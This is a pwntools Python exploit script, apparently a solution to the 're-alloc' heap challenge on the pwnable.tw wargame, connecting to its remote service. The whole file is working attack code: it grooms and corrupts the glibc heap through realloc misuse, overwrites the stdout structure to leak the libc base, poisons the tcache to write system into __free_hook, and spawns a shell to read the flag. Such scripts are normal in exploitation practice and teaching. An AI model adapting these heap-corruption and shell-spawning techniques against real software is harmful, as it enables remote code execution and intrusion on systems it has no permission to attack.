#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"

e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass
def alloc(idx, size, data=b"aaa"):
	ru(b"Your choice:")
	sl(b"1")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	ru(b"Data:")
	sn(data)
def realloc(idx, size, data=None):
	ru(b"Your choice:")
	sl(b"2")
	ru(b"Index:")
	sl(str(idx).encode())
	ru(b"Size:")
	sl(str(size).encode())
	if size:
		ru(b"Data:")
		sn(data)
def free(idx):
	ru(b"Your choice:")
	sl(b"3")
	ru(b"Index:")
	sl(str(idx).encode())

while 1:
	# p = process(filename)
	p = remote("chall.pwnable.tw",10310)
	try:
		
		alloc(0, 0x38)
		free(0)
		for i in range(6):
			alloc(0, 0x18)
			realloc(0, 0x78, b'a')
			free(0)
		alloc(0, 0x18)
		realloc(0, 0x78, b'a')
		alloc(1, 0x18)
		realloc(1, 0x78, b'a')
		free(1)
		free(0)

		ru(b"Your choice:")
		sn(b'1'*0x400 + b'\n')

		alloc(0, 0x78)
		realloc(0, 0)
		realloc(0, 0x78, p8(0xa0))
		alloc(1, 0x78)
		realloc(0, 0x38, b'a')
		free(0)
		realloc(1, 0x18, b'a')
		free(1)
		# lg("p.pid")
		# guessBIT0 = int(input("[*] input IO_stdout bit: "), 16)
		guessBIT0 = 0x7
		alloc(0, 0x48, b'a')
		realloc(0, 0x48, p16((guessBIT0<<12) + 0x760))
		alloc(1, 0x78)
		realloc(1, 0x38, b'a')
		free(1)
		alloc(1, 0x78, p64(0xfbad1887) + p64(0)*3)
		rn(8)
		libc_base = uu64(rn(8)) - 0x1e7570
		assert libc_base < 0x7fffffffffff
		lg("libc_base")
		# input()
		realloc(0, 0x28, b'a'*0x10)
		free(0)
		alloc(0, 0x68)
		realloc(0, 0)
		realloc(0, 0x18, b'a'*0x10)
		free(0)
		alloc(0, 0x68, p64(0)*3 + p64(0x51) + p64(libc_base + l.symbols['__free_hook'] - 8))
		free(0)
		alloc(0, 0x48, b'a'*0x10)
		realloc(0, 0x18, b'a'*0x10)
		free(0)
		debugPID()
		alloc(0, 0x48, b"/bin/sh\x00" + p64(libc_base + l.symbols["system"]))
		free(0)

		sl(b"cat /home/re-alloc*/flag")
		irt()
	except Exception as e:
		p.close()